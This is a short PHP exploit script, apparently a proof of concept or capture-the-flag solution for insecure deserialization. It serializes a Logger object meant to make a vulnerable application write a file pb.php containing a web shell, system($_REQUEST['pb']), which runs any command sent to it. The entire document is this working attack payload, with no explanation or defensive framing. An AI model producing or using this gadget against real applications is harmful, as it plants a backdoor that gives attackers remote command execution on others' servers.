<?php
require("logger.php");
$file = 'pb.php';
$data = '<?php system($_REQUEST["pb"]);';
$o = new Logger($file, $data);
echo serialize($o);
exit();
?>
